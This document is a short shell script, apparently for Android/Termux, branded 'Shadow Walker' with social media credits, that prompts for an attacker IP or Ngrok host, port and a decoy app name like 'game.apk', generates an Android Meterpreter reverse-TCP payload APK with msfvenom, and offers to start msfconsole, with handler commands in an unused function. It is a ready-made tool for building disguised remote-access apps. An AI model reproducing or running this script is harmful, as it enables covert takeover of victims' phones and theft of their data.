#!/system/bin/sh

#colors


#text colors

red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
pink=$(tput setaf 5)
cyan=$(tput setaf 6)
white=$(tput setaf 7)

bt=$(tput bold 2)
#reset color

reset=$(tput sgr0)


#functions
data() {
    use exploit/multi/handler
    set PAYLOAD android/meterpreter/reverse_tcp
    set LHOST $lhost
    set LPORT $lport
    exploit
   
}



cd
clear

echo "${yellow}${bt}"
echo "                 ╔═════•|✿|•═════╗"
echo "                   Shadow Walker"
echo "                 ╚═════•|✿|•═════╝"
echo "${reset}"
echo "${bt}"
echo "${cyan} ~ Script Is Made By Ihtisham Ali (Shadow Walker)"
echo "${cyan} ~ YouTube Channel: Shadow Walker"
echo "${cyan} ~ Instagram: ShadowWalker143"
echo
echo "${white}${bt} • Payload Generator ${reset}"
echo "${red}${bt} • This Script Will Only Work If You've"
echo "   Metasploit Installed ${reset}"
echo 
echo "${green}${bt} ~ Enter Your LHOST (IP Or Ngrok):${reset}${blue}${bt}"
read lhost
echo "${green}${bt} ~ Enter Your LPORT (4444):${reset}${blue}${bt}"
read lport
echo "${green}${bt} ~ Enter Your App Name (game.apk):${reset}${blue}${bt}"
read name
echo
echo "${yellow}${bt}Please Wait The App Is Generating...${reset}"
echo
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /sdcard/$name
echo "${pink}${bt}"
echo " ~ App Generated Successfully"
echo " ~ App Saved To /sdcard/$name"
echo "${reset}"
echo "${green}${bt} ~ Start A Msfconsole? (y/n):"
read ans
echo
if [[ $ans == y ]]; then
    echo "${yellow}${bt}Please Wait The Msfconsole Is Starting...${reset}"
    echo
    msfconsole
    
else 
   echo " ~ Have A Nice Day"
   exit
fi